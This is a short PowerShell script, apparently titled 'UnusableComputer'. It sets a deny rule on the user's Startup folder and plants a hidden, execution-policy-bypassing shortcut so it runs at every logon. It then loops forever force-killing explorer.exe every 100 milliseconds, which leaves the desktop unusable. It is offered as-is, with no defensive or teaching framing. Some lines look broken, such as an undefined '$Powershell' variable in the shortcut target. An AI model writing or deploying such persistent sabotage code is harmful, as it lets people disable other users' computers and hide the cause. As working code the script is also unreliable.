# Deny access to the startup folder
$acl = Get-Acl "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Users", "ReadAndExecute", "Deny")
$acl.SetAccessRule($rule)
Set-Acl "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" $acl

# Create a shortcut to the PowerShell script in the startup folder
$shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\UnusableComputer.lnk"
$targetPath = "$Powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$PSScriptRoot\UnusableComputer.ps1"""
$wshShell = New-Object -ComObject WScript.Shell
$shortcut = $wshShell.CreateShortcut($shortcutPath)
$shortcut.Targetpath = $targetpath
$shortcut.Save()

# Main script that taskkills explorer if it's running
while ($true) {
    if (Get-Process explorer -ErrorAction SilentlyContinue) {
        taskkill /F /IM explorer.exe
    }
    Start-Sleep -Milliseconds 100
}
